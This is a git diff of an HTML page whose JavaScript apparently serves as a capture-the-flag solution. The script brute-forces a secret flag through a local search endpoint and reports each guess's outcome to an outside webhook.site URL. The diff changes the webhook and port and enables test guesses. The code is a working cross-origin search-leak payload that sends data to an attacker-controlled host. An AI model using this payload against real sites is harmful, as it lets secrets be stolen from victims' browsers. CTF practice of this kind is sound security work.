@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <body>
     <script>
-    var whook = 'https://webhook.site/124a8de9-b6df-42d6-ae06-869f6503e3fa/'
-    var url = "http://127.0.0.1:1337/api/entries/search?q=";
+    var whook = 'https://webhook.site/72848291-db2a-451d-a6d2-47693becab3c/'
+    var url = "http://127.0.0.1:1338/api/entries/search?q=";
     var htb = 'HTB';
     var letters = '';
         
@@ -20,6 +20,7 @@
 
         
     async function doGuess(g){
+        console.log('attempting '+url+g);
         await fetch(url+g)
         .then(response => {
             if(response.ok){
@@ -30,9 +31,9 @@
         .catch(error => {fetch(whook+g+'failed')})
     }
     makeFetchRequest();
-    //doGuess('H');
-   // doGuess('HT');
-   // doGuess('HTB');
+    doGuess('H');
+    doGuess('HT');
+    doGuess('HELLOWORLD');
   //  doGuess('HTB{');
    // console.log("newest");
     </script>
